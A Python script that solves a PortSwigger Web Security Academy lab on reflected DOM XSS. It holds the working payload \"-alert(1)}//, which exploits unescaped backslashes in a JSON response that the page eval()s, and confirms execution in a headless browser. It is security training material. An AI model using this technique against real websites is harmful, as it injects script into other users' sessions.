#!/usr/bin/env python3
"""
Reflected DOM XSS
PortSwigger Web Security Academy — Cross-Site Scripting (XSS)

Companion script for the writeup: 12-reflected-dom-xss.md

What this does:
    The search term comes back inside a JSON response from a
    search-results endpoint, which client-side JS then eval()'s as
    `eval('var data = ' + responseText)`. Probing that endpoint shows
    quotes are escaped in the JSON serialization but backslashes are not --
    a literal backslash we supply neutralizes the encoder's own escaping of
    the following quote it inserts. The payload uses that asymmetry to
    terminate the JSON string early, run alert(1), and comment out the
    trailing syntax the application appends. Confirms execution with a
    headless browser (the eval() only runs client-side, after the page's
    own JS issues the background request).

Usage:
    python 12-reflected-dom-xss.py <lab-url>
    e.g. python 12-reflected-dom-xss.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
    pip install playwright && playwright install chromium
"""

import sys
import urllib.parse
import httpx
from playwright.sync_api import sync_playwright

# Leading backslash isn't escaped by the response's JSON serialization, so it
# combines with the closing quote the server inserts to break out of the
# string early; }// absorbs the rest of the JSON without a syntax error.
PAYLOAD = '\\"-alert(1)}//'


def solve(lab_url: str) -> None:
    client = httpx.Client(base_url=lab_url, follow_redirects=True, timeout=20)
    client.get("/")
    session = client.cookies.get("session", "")
    domain = urllib.parse.urlparse(lab_url).netloc

    # Confirm the asymmetry the payload relies on: quotes escaped, backslash not.
    probe = client.get(f"{lab_url}/search-results", params={"search": '"'})
    if '\\"' in probe.text:
        print("[*] Confirmed: double quotes are escaped in the JSON response")
    probe = client.get(f"{lab_url}/search-results", params={"search": "\\"})
    if "\\\\" not in probe.text:
        print("[*] Confirmed: backslashes are NOT escaped in the JSON response")

    url = f"{lab_url}/?search={urllib.parse.quote(PAYLOAD)}"
    print(f"[*] Payload: {PAYLOAD}")
    print(f"[*] Delivering to: {url}")

    alert_fired = False
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        ctx = browser.new_context()
        if session:
            ctx.add_cookies([{"name": "session", "value": session, "domain": domain, "path": "/"}])
        page = ctx.new_page()

        def on_dialog(dialog):
            nonlocal alert_fired
            alert_fired = True
            dialog.accept()

        page.on("dialog", on_dialog)
        try:
            page.goto(url, wait_until="networkidle", timeout=15000)
            page.wait_for_timeout(3000)
        except Exception:
            pass
        browser.close()

    print(f"[{'+' if alert_fired else '-'}] alert() {'fired' if alert_fired else 'did NOT fire'}")

    check = client.get("/")
    if "Congratulations" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
